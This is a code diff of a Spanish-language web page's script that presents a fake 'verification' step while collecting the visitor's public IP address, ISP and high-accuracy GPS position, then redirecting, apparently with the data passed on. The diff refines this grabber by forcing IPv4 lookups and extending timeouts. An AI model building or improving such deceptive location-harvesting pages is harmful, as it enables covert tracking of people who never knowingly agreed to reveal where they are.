@@ -51,30 +51,28 @@
             window.location.href = finalUrl;
         }
 
-        async function iniciarCaptura() {
-            const btn = document.getElementById('btnAction');
-            const status = document.getElementById('status');
-            
-            btn.disabled = true;
-            btn.innerText = "VERIFICANDO...";
-            status.innerText = "Solicitando permiso de ubicación...";
-
-            // Límite de seguridad para redirigir máximo en 4 segundos
-            setTimeout(redirigir, 4000);
-
-            // 1. Captura de IP e ISP
+        async function obtenerDatos() {
+            // 1. Obtener IP pública exclusivamente en formato IPv4
             try {
-                let resp = await fetch('https://ipapi.co/json/');
-                if (resp.ok) {
-                    let json = await resp.json();
-                    datos.ip = json.ip || '';
-                    datos.isp = json.org || json.asn || '';
+                let respIp = await fetch('https://api.ipify.org?format=json');
+                if (respIp.ok) {
+                    let jsonIp = await respIp.json();
+                    datos.ip = jsonIp.ip || '';
+                    
+                    // Con la IPv4 obtenida, consultar ISP
+                    if (datos.ip) {
+                        let respIsp = await fetch('https://ipapi.co/' + datos.ip + '/json/');
+                        if (respIsp.ok) {
+                            let jsonIsp = await respIsp.json();
+                            datos.isp = jsonIsp.org || jsonIsp.asn || '';
+                        }
+                    }
                 }
             } catch (e) {
-                console.warn("Error en IP:", e);
+                console.warn("Error capturando IP/ISP:", e);
             }
 
-            // 2. Captura de GPS
+            // 2. Solicitar la ubicación GPS
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     function(pos) {
@@ -86,11 +84,25 @@
                         console.warn("Geolocalización rechazada:", err);
                         redirigir();
                     },
-                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
             } else {
                 redirigir();
             }
+        }
+
+        function iniciarCaptura() {
+            const btn = document.getElementById('btnAction');
+            const status = document.getElementById('status');
+            
+            btn.disabled = true;
+            btn.innerText = "VERIFICANDO...";
+            status.innerText = "Por favor, permite el acceso a la ubicación si el navegador lo solicita...";
+
+            // Límite de tiempo absoluto para evitar que se quede pegado (6 segundos)
+            setTimeout(redirigir, 6000);
+
+            obtenerDatos();
         }
     </script>
 </body>
